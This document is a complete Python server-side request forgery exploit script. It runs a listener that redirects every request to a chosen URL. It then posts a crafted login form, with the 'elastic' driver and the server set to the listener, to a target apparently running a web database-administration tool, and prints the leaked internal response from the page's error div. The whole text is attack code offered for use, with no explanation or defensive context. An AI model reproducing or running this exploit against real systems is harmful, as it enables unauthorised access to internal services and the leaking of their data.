from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
import argparse
import requests
from bs4 import BeautifulSoup


class RedirectHandler(BaseHTTPRequestHandler):
    def __init__(self, redirect, *args):
        self.redirect = redirect
        BaseHTTPRequestHandler.__init__(self,*args)

    def do_GET(self):
        self.send_response(301)
        self.send_header('Location', self.redirect)
        self.end_headers()


def run_server(host, port, redirect):
    def redirect_handler(*args):
        RedirectHandler(redirect, *args)
    daemon = HTTPServer((host, port), redirect_handler)
    daemon.serve_forever()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-target', required=True, help='url of target')
    parser.add_argument('-redirect', required=True, help='url for redirect path')
    parser.add_argument('-host', required=True, help='host ip to listen')
    parser.add_argument('-port', default=80, help='listening server port')

    args = parser.parse_args()

    print(f'[*] Listening on {args.port}')
    t = Thread(target=run_server, args=('0.0.0.0', args.port, args.redirect), daemon=True)
    t.start()

    print('[*] Send Exploit...')
    params = {
        'auth[driver]': 'elastic',
        'auth[server]': args.host,
        'auth[username]': 'test',
        'auth[password]': 'test',
        'auth[db]': 'test',
        'auth[permanent]': 0
    }

    try:
        res = requests.post(url=args.target, data=params)
        html = BeautifulSoup(res.text,'html.parser')
    except Exception as e:
        print()

    print('[*] SSRF Response')
    print(html.find('div', {'class': 'error'}).text)
